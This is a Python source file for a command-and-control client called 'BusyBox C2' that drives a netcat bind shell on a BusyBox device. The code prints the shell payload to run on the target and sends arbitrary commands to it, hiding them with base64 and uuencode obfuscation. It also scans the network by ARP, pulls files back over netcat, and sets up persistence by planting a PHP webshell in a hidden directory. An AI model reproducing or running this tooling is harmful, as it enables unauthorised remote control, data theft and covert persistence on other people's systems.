from pyfiglet import Figlet
import socket, select, sys, time
import subprocess
import os
import random
import threading
import re

class BusyBoxC2:
    def __init__(self, server_ip, server_port):

        # Init app variables
        self.server_ip = server_ip
        self.server_port = server_port
        self.prompt = " (busybox-c2)> "
        self.options = []

        # Show banner
        self._show_banner()

        # Show payload to send
        payload = "busybox nc -lp " + str(server_port) + " -e ash"
        print(f"[*] Payload to execute: {payload}\n")

        # Init socket
        self.socket = self._init_socket()

    def _show_banner(self):
        print(Figlet(font="slant").renderText("BusyBox C2"))

    def _init_socket(self):
        print(f"[...] Initialization of TCP connection to {self.server_ip}:{self.server_port}")
        while True:
            try:
                self.socket = socket.create_connection((self.server_ip, self.server_port))
                print("[+] New connection !\n")
                break
            except KeyboardInterrupt:
                exit(0)
            except:
                pass

        self.socket.setblocking(False)
        return self.socket

    def _send_cmd(self, cmd):

        # Add marker to know when command execution is terminated
        marker = "M{}".format(int(time.time()*1000))
        full_cmd = cmd + " ; echo " + marker

        # Obfuscate full cmd if necessary
        if "obfuscation_ascii" in self.options:
            full_cmd = self._cmd_obfuscation_ascii(full_cmd)
            print(f"Executed command: {full_cmd}\n")
        if "obfuscation_base64" in self.options:
            full_cmd = self._cmd_obfuscation_b64(full_cmd)
            print(f"Executed command: {full_cmd}\n")

        # Send payload and wait marker in response to stop reading socket
        self.socket.sendall((full_cmd + "\n").encode())
        buf = bytearray()
        printed = 0
        marker_b = marker.encode()
        while True:
            r, _, _ = select.select([self.socket], [], [], 0.5)
            if r:
                try:
                    chunk = self.socket.recv(4096)
                except BlockingIOError:
                    continue
                if not chunk:
                    if printed < len(buf):
                        sys.stdout.write(buf[printed:].decode(errors="replace"))
                        sys.stdout.flush()
                    return [bytes(buf)]
                buf.extend(chunk)
                idx = buf.find(marker_b)
                if idx != -1:
                    if printed < idx:
                        sys.stdout.write(buf[printed:idx].decode(errors="replace"))
                        sys.stdout.flush()
                    return [bytes(buf)]
                else:
                    if len(buf) > printed:
                        sys.stdout.write(buf[printed:].decode(errors="replace"))
                        sys.stdout.flush()
                        printed = len(buf)
            else:
                continue

    def _cmd_obfuscation_b64(self, raw_cmd):
        cmd_to_get_cmd_b64_version = 'printf ' + '"' + raw_cmd + '"' + ' | busybox uuencode -m - | sed -n "2p"'
        ascii_cmd = subprocess.check_output(cmd_to_get_cmd_b64_version, shell=True, text=True)
        payload = "s=\"" + ascii_cmd.rstrip("\n").replace("`", "\`").replace("\"", "\\\"") + "\";printf 'begin-base64 644 -\\n%s\\n`\\n====\\n' $s|busybox uudecode |ash"
        return payload
    
    def _cmd_obfuscation_ascii(self, raw_cmd):
        cmd_to_get_cmd_ascii_version = 'printf ' + '"' + raw_cmd + '"' + ' | busybox uuencode - | sed -n "2p"'
        ascii_cmd = subprocess.check_output(cmd_to_get_cmd_ascii_version, shell=True, text=True)
        payload = "s=\"" + self.sanitize_ash_var(ascii_cmd) + "\";printf 'begin 644 -\\n%s\\n`\\nend\\n' $s|busybox uudecode|ash"
        return payload
    
    def sanitize_ash_var(self, variable):
        sanitize_variable = variable.rstrip("\n")
        return re.sub(r'([`"\\$])', r'\\\1', sanitize_variable)

    def _discover_arp_scan(self):
        net_ip = input("Network IP (ex: 192.168.1.0): ")
        range = input("Range (max: 254): ")

        cmd = "for i in $(seq 1 " + range + "); do sudo arping -c 1 -w 0 " + net_ip[:-1] + "$i >/dev/null 2>&1 && echo \"[+]" + net_ip[:-1] + "$i\"; done"

        print("[*] Start scanning...")
        self._send_cmd(cmd)
        print("[*] Scan ended")

    def _download(self):
        file_name = input("File to download: ")
        listening_port = random.randint(1024, 65534)
        listener_cmd = "nc -lp " + str(listening_port) + " > " + file_name

        # Send command to get the file with a delay to wait server availability
        cmd = "sleep 0.5; nc " + self.server_ip + " " + str(listening_port) + " < " + file_name
        t = threading.Thread(target=self._send_cmd, args=(cmd,))
        t.start()

        # Launch listener to receive file
        os.system(listener_cmd)

        return listening_port, t
    
    def _install_webshell(self):

        ### ToDo : Upload a tar archive and extract it to preserve execution rights on files.


        # Webshell destination path
        webshell_destination_path = "/run/user/$(id -u)/.http/"

        # Create web directory on remote
        cmd = "mkdir -p " + webshell_destination_path
        self._send_cmd(cmd)

        # Upload all ressources on remote
        webshell_ressources_path = "./ressources/webshell/"
        webshell_files = ["httpd.conf", "index.php", "php-cgi", "php-wrapper"]
        for file in webshell_files:
            listening_port = random.randint(1024, 65534)
            remote_cmd = "nc -lp " + str(listening_port) + " > " + webshell_destination_path + file
            #print("Remote cmd: " + remote_cmd)
            t = threading.Thread(target=self._send_cmd, args=(remote_cmd,))
            t.start()
            local_cmd = "sleep 0.2; busybox nc " + self.server_ip + " " + str(listening_port) + " < " + webshell_ressources_path + file
            #print("Local cmd: " + local_cmd)
            os.system(local_cmd)

        # Chmod necessary files (to remove)
        cmd = "chmod +x " + webshell_destination_path + "php-*"
        self._send_cmd(cmd)
    
        # Run webserver
        webserver_port = random.randint(1024, 65534)
        cmd = "httpd -p " + str(webserver_port) + " -c " + webshell_destination_path + "httpd.conf -h " + webshell_destination_path
        self._send_cmd(cmd)
        print(f"[*] Your webshell is ready on http://{self.server_ip}:{webserver_port}/index.php")

    def run(self):
        try:
            while True:
                try:
                    cmd = input(self.prompt)

                    match cmd.strip().lower():
                        case 'exit' | '/exit':
                            break
                        case '/options_disable' | '/o_d':
                            self.options.clear()
                            self.prompt = " (busybox-c2)> "
                        case '/options_show' | '/o_s' | '/options' | '/o':
                            for option in self.options:
                                print(f"{option} ")
                        case '/obfuscation_ascii' | '/obf_a':
                            self.options.append('obfuscation_ascii')
                            self.prompt = " (busybox-c2)[+]> "
                        case '/obfuscation_base64' | '/obf_b64':
                            self.options.append('obfuscation_base64')
                            self.prompt = " (busybox-c2)[+]> "
                        case '/scan_discover':
                            self._discover_arp_scan()
                        case '/download':
                            self._download()
                        case '/persistence_webshell':
                            # launch web server and drop pwnyshell
                            self._install_webshell()
                            pass
                        case _:
                            self._send_cmd(cmd)
                except (EOFError, KeyboardInterrupt):
                    break
                if not cmd:
                    continue
        finally:
            self.socket.close()